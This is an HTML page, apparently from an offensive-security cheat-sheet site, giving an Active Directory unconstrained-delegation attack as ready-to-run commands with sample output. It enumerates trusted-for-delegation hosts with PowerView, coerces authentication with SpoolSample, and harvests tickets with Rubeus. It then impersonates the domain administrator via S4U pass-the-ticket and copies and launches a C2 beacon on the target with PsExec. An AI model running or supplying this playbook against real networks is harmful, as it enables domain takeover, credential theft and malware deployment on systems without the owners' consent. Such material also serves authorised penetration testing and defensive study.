@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Unconstrained Delegation | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/unconstrained_delegation/">
+      <span>Unconstrained Delegation</span>
+    </a>
+  </h1>
+  <div class="js-toggle-wrapper">
+    <div class="js-toggle">
+        <div class="js-toggle-track">
+            <div class="js-toggle-track-check">
+                <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+            </div>
+            <div class="js-toggle-track-x">
+                <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
+            </div>
+        </div>
+        <div class="js-toggle-thumb"></div>
+        <input class="js-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
+    </div>
+</div>
+    
+<style>
+ 
+
+ 
+.js-toggle-wrapper, .js-toggle {
+    margin: 0;
+    padding: 0;
+    border: 0;
+    box-sizing: border-box;
+}
+
+.js-toggle-wrapper {
+    display: table;
+    float: right;
+    margin-left: auto;
+}
+
+.js-toggle {
+    touch-action: pan-x;
+    display: inline-block;
+    position: relative;
+    cursor: pointer;
+    background-color: transparent;
+    user-select: none;
+}
+
+.js-toggle-screenreader-only {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    margin: -1px;
+    padding: 0;
+    overflow: hidden;
+    clip: rect(0, 0, 0, 0);
+}
+
+.js-toggle-track {
+    width: 50px;
+    height: 24px;
+    border-radius: 30px;
+    background-color: hsl(223, 61%, 44%);
+    transition: background-color 0.2s ease;
+}
+
+.js-toggle-track-check,
+.js-toggle-track-x {
+    position: absolute;
+    width: 17px;
+    height: 17px;
+    top: 50%;
+    transform: translateY(-50%);
+    transition: opacity 0.25s ease;
+}
+
+.js-toggle-track-check {
+    left: 5px;
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track-check {
+    opacity: 1;
+}
+
+.js-toggle-track-x {
+    right: 5px;
+    opacity: 1;
+}
+
+.js-toggle--checked .js-toggle-track-x {
+    opacity: 0;
+}
+
+.js-toggle--checked .js-toggle-track {
+    background-color: hsl(222, 14%, 7%);
+}
+
+.js-toggle-thumb {
+    position: absolute;
+    top: 1px;
+    left: 1px;
+    width: 22px;
+    height: 22px;
+    border-radius: 50%;
+    background-color: #fafafa;
+    transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+}
+
+.js-toggle--checked .js-toggle-thumb {
+    transform: translateX(26px);
+}
+</style>
+
+<script>
+    var body = document.body;
+    var switcher = document.getElementsByClassName('js-toggle')[0];
+
+    
+    switcher.addEventListener("click", function() {
+        this.classList.toggle('js-toggle--checked');
+        
+        if (this.classList.contains('js-toggle--checked')) {
+            body.classList.add('dark-mode');
+            
+            localStorage.setItem('darkMode', 'true');
+        } else {
+            body.classList.remove('dark-mode');
+            setTimeout(function() {
+                localStorage.removeItem('darkMode');
+            }, 100);
+        }
+    })
+
+    
+    if (localStorage.getItem('darkMode')) {
+        
+        switcher.classList.add('js-toggle--checked');
+        body.classList.add('dark-mode');
+    }
+</script>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@pass-the-ticket/">Pass-the-Ticket</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@s4u/">S4U</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@unconstrained-delegation/">Unconstrained Delegation</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@psexec/">Psexec</a></li>
+  
+</ul>
+<hr>
+<div class="content">
+  <div id="dynamicFormContainer">
+	<form id="dynamicForm" style="display: none;">
+	</form>
+	<div class="buttons center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
+
+<style>
+#dynamicFormContainer {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 0;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#dynamicFormContainer * {
+    box-sizing: border-box;
+}
+
+#dynamicFormContainer input {
+  border-radius: 0.2em;
+  margin-bottom: 15px;
+}
+
+#dynamicFormContainer input:focus {
+  outline: 0.1em solid var(--secondary);
+}
+
+#dynamicFormContainer input[type=text] {
+  width: 100%;
+  border-radius: 0.2em;
+  border: 0.1em solid var(--secondary);
+  padding: 0.4rem;
+  font-size: 0.9rem;
+}
+
+#dynamicFormContainer label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#dynamicFormContainer button {
+	display: inline-block;
+	margin: 20px auto;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+	grid-column: 1 / span 2;
+    justify-self: center;
+}
+
+#dynamicFormContainer button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+#dynamicForm {
+    grid-template-columns: 1fr 1fr;
+    column-gap: 20px;
+    row-gap: 0px;
+    margin: 0 auto;
+    padding: 30px 20px 0;
+}
+
+.input-group {
+    display: flex;
+    flex-direction: column;
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #dynamicFormContainer {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 0;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #dynamicFormContainer * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #dynamicFormContainer input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #dynamicFormContainer input:focus {
+	outline: 0.1em solid #616161;
+}
+
+body.dark-mode #dynamicFormContainer input[type=text] {
+  width: 100%;
+  border-radius: 0.2em;
+  border: 0.1em solid #616161;
+  padding: 0.4rem;
+  font-size: 0.9rem;
+  background-color: #bdbdbd;
+}
+
+body.dark-mode #dynamicFormContainer label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #dynamicFormContainer button {
+	display: inline-block;
+	margin: 20px auto;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+	grid-column: 1 / span 2;
+    justify-self: center;
+}
+
+body.dark-mode #dynamicFormContainer button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+</style>
+  <h3 id="abuse-1-capture-ticket">Abuse #1: Capture Ticket</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" >Windows</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-check-trusted_for_delegation">1. Check TRUSTED_FOR_DELEGATION</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainComputer
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainComputer
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">logoncount                    : 131
+</span></span></span><span class="line"><span class="cl"><span class="go">badpasswordtime               : 12/31/1600 4:00:00 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">distinguishedname             : CN=SRV002,CN=Computers,DC=Example,DC=local
+</span></span></span><span class="line"><span class="cl"><span class="go">objectclass                   : {top, person, organizationalPerson, user...}
+</span></span></span><span class="line"><span class="cl"><span class="go">badpwdcount                   : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">displayname                   : SRV002$
+</span></span></span><span class="line"><span class="cl"><span class="go">lastlogontimestamp            : 11/23/2024 2:29:01 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">objectsid                     : S-1-5-21-422340810-923920092-1608110645-1103
+</span></span></span><span class="line"><span class="cl"><span class="go">samaccountname                : SRV002$
+</span></span></span><span class="line"><span class="cl"><span class="go">localpolicyflags              : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">codepage                      : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">samaccounttype                : MACHINE_ACCOUNT
+</span></span></span><span class="line"><span class="cl"><span class="go">countrycode                   : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">cn                            : SRV002
+</span></span></span><span class="line"><span class="cl"><span class="go">accountexpires                : NEVER
+</span></span></span><span class="line"><span class="cl"><span class="go">whenchanged                   : 11/23/2024 2:26:27 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">instancetype                  : 4
+</span></span></span><span class="line"><span class="cl"><span class="go">usncreated                    : 16398
+</span></span></span><span class="line"><span class="cl"><span class="go">objectguid                    : e54dc358-b87f-49ad-8bcf-2029bf051006
+</span></span></span><span class="line"><span class="cl"><span class="go">operatingsystem               : Windows Server 2019 Standard
+</span></span></span><span class="line"><span class="cl"><span class="go">operatingsystemversion        : 10.0 (17763)
+</span></span></span><span class="line"><span class="cl"><span class="go">lastlogoff                    : 12/31/1600 4:00:00 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=Example,DC=local
+</span></span></span><span class="line"><span class="cl"><span class="go">dscorepropagationdata         : {1/13/2020 5:47:08 PM, 1/13/2020 5:47:08 PM, 1/13/2020 5:47:08 PM, 1/13/2020 5:47:08 
+</span></span></span><span class="line"><span class="cl"><span class="go">                                PM...}
+</span></span></span><span class="line"><span class="cl"><span class="go">serviceprincipalname          : {TERMSRV/SRV002, TERMSRV/srv002.Example.local, WSMAN/srv002, 
+</span></span></span><span class="line"><span class="cl"><span class="go">                                WSMAN/srv002.Example.local...}
+</span></span></span><span class="line"><span class="cl"><span class="go">lastlogon                     : 11/23/2024 6:55:52 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">iscriticalsystemobject        : False
+</span></span></span><span class="line"><span class="cl"><span class="go">usnchanged                    : 139420
+</span></span></span><span class="line"><span class="cl"><span class="go">useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
+</span></span></span><span class="line"><span class="cl"><span class="go">whencreated                   : 1/12/2020 10:24:53 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">primarygroupid                : 515
+</span></span></span><span class="line"><span class="cl"><span class="go">pwdlastset                    : 3/15/2020 8:38:58 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">msds-supportedencryptiontypes : 28
+</span></span></span><span class="line"><span class="cl"><span class="go">name                          : SRV002
+</span></span></span><span class="line"><span class="cl"><span class="go">dnshostname                   : srv002.Example.local
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span></code></pre></div><h4 id="2-spoolsample">2. SpoolSample</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run multiple <span class="nb">times</span>
+</span></span><span class="line"><span class="cl"><span class="go">.\SpoolSample.exe &lt;TARGET_DOMAIN&gt; &lt;CURRENT_DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\SpoolSample.exe SRV001.EXAMPLE.LOCAL SRV002.EXAMPLE.LOCAL
+</span></span></span><span class="line"><span class="cl"><span class="go">.\SpoolSample.exe SRV001.EXAMPLE.LOCAL SRV002.EXAMPLE.LOCAL
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Converted DLL to shellcode
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Executing RDI
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Calling exported function
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/leechristensen/SpoolSample">SpoolSample.exe</a></em></small></p>
+<h4 id="3-monitor-ticket-change">3. Monitor Ticket Change</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe monitor /interval:1 /nowrap
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\rubeus.exe monitor /interval:1 /nowrap
+</span></span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe monitor /interval:1 /nowrap
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: TGT Monitoring
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Monitoring every 1 seconds for new TGTs
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] 11/23/2024 3:18:19 PM UTC - Found new TGT:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  User                  :  SRV001$@EXAMPLE.LOCAL
+</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime             :  11/23/2024 2:29:32 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime               :  11/23/2024 12:28:56 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill             :  11/30/2024 2:28:56 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+</span></span></span><span class="line"><span class="cl"><span class="go">  Base64EncodedTicket   :
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] 11/23/2024 3:18:19 PM UTC - Found new TGT:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  User                  :  SRV002$@EXAMPLE.LOCAL
+</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime             :  11/23/2024 2:29:01 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime               :  11/23/2024 12:29:01 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill             :  11/30/2024 2:29:01 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+</span></span></span><span class="line"><span class="cl"><span class="go">  Base64EncodedTicket   :
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] 11/23/2024 3:18:19 PM UTC - Found new TGT:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  User                  :  SRV002$@EXAMPLE.LOCAL
+</span></span></span><span class="line"><span class="cl"><span class="go">  StartTime             :  11/23/2024 2:29:01 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  EndTime               :  11/23/2024 12:29:01 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">  RenewTill             :  11/30/2024 2:29:01 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+</span></span></span><span class="line"><span class="cl"><span class="go">  Base64EncodedTicket   :
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    doIFqjCCBa ...[SNIP]... guTE9DQUw=
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Ticket cache size: 3
+</span></span></span></code></pre></div><h4 id="4-impersonate">4. Impersonate</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /impersonateuser:administrator /ticket:&lt;BASE64_TICKET&gt; /altservice:cifs/&lt;TARGET_DOMAIN&gt; /self /ptt
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\rubeus.exe s4u /impersonateuser:administrator /ticket:doIFqjCCBa...[SNIP]...guTE9DQUw= /altservice:cifs/srv001.example.local /self /ptt /nowrap
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Building S4U2self request for: &#39;SRV001$@example.LOCAL&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: dc.example.local (192.168.22.10)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending S4U2self request to 192.168.22.10:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2self success!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Substituting alternative service name &#39;cifs/srv001.example.local&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got a TGS for &#39;administrator&#39; to &#39;cifs@example.LOCAL&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGMDCCBi...[SNIP]...5sb2NhbA==
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Ticket successfully imported!
+</span></span></span></code></pre></div><h4 id="5-check">5. Check</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">dir \\&lt;TARGET_DOMAIN&gt;\C$
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; dir \\srv001.example.local\C$
+</span></span></span><span class="line"><span class="cl"><span class="go">dir \\srv001.example.local\C$
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Directory: \\srv001.example.local\C$
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Mode                LastWriteTime         Length Name                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">----                -------------         ------ ----                                                                  
+</span></span></span><span class="line"><span class="cl"><span class="go">d-----        7/24/2020   6:52 AM                PerfLogs                                                              
+</span></span></span><span class="line"><span class="cl"><span class="go">d-r---        7/18/2024   7:21 AM                Program Files                                                         
+</span></span></span><span class="line"><span class="cl"><span class="go">d-----        1/13/2020   9:46 AM                Program Files (x86)                                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">d-r---        1/12/2020   2:28 AM                Users                                                                 
+</span></span></span><span class="line"><span class="cl"><span class="go">d-----        7/18/2024   4:16 PM                Windows
+</span></span></span></code></pre></div><h4 id="6-psexec">6. PsExec</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For Example, a C2 Beacon
+</span></span><span class="line"><span class="cl"><span class="go">cp C:\programdata\beacon.exe \\&lt;TARGET_DOMAIN&gt;\C$\Programdata
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\PsExec64.exe -accepteula \\&lt;TARGET_DOMAIN&gt; -h &#39;C:\programdata\beacon.exe&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\PsExec64.exe -accepteula \\srv001.example.local -h &#39;C:\programdata\beacon.exe&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">.\PsExec64.exe -accepteula \\srv001.example.local -h &#39;C:\programdata\beacon.exe&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PsExec v2.43 - Execute processes remotely
+</span></span></span><span class="line"><span class="cl"><span class="go">Copyright (C) 2001-2023 Mark Russinovich
+</span></span></span><span class="line"><span class="cl"><span class="go">Sysinternals - www.sysinternals.com
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting C:\programdata\beacon.exe on srv001.example.local...
+</span></span></span><span class="line"><span class="cl"><span class="go">C:\programdata\beacon.exe exited on srv001.example.local with error code 0.
+</span></span></span></code></pre></div></div></p>
+
+</div></div>
+    
+    <script type="module" src="/js/main.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+    </div>
+</footer>
+</body>
+</html>
